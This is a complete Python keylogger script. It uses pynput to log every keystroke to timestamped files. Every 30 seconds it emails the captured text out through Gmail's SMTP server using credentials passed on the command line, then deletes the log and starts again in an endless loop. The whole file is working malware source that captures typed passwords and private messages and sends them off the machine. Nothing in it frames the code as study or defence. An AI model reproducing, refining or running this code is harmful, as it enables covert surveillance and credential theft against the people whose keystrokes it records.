import datetime,time
from pynput.keyboard import Listener
import smtplib
import sys
import os
gmail=sys.argv[1]
password=sys.argv[2]

def key_listener():
    # actual date
    d=datetime.datetime.now().strftime('%y-%m-%d_%H-%M-%S')

    # creates a file with actual date
    directory='logs'
    if not os.path.exists(directory):
        os.makedirs(directory)
    file_name='keylogger-{}.txt'.format(d)
    path=directory+'/'+file_name
    f=open(path,'w')

    # initial time
    time0=time.time()

     #send mail function
    def send_email():
        with open(path,'r+') as f:
             data=f.read()
        try:
            server=smtplib.SMTP('smtp.gmail.com',587)
            server.starttls()
            server.login(gmail,password)
            server.sendmail(gmail,gmail,data)
            print('Email has been sent correctly')
            server.quit()
            os.remove(path)
            key_listener()
        except:
            print("Email has not been sent :(")
            server.quit()
            os.remove(path)
            key_listener()

    # key recorder function
    def key_recorder(key):
        key=str(key)
        if key=='Key.ctrl':
            f.write('')
        elif key=='Key.enter':
            f.write('\n')
        elif key=='Key.space':
            f.write(' ')
        elif key=='Key.shift_r' or key=='Key.backspace' or key=='Key.shift_l' or key=='Key.shift':
            f.write('')
        else:
            f.write(key.replace("'",""))

        if time.time()-time0>30:
            f.close()
            send_email()

    with Listener(on_press=key_recorder) as listener:
        listener.join()

# circle
while True:
    key_listener()
